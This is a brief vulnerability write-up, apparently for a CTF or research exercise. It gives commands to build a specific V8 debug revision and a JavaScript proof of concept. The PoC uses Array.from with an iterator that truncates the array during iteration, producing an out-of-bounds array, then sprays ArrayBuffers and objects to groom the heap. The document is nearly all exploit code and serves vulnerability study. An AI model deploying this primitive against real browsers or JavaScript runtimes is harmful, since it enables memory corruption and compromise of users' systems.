# Build

```
git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599
gclient sync
tools/dev/v8gen.py x64.debug 
ninja -C out.gn/x64.debug d8
```

#POC

```javascript=
var bufs = [];
var objs = [];
var oobArray = [1.1];
var maxSize = 1028 * 8;

Array.from.call(function() { return oobArray; }, {[Symbol.iterator] : _ => (
    {
        counter : 0,
        next() {
            let result = 1.1;
            this.counter++;
            if (this.counter > maxSize) {
                oobArray.length = 1;
                for (let i = 0;i < 100;i++) {
                    bufs.push(new ArrayBuffer(0x1234));
                    let obj = {'a': 0x4321, 'b': 0x9999};
                    objs.push(obj);
                }
                return {done: true};
            } else {
                return {value: result, done: false};
            }
        }
    }
)});
```
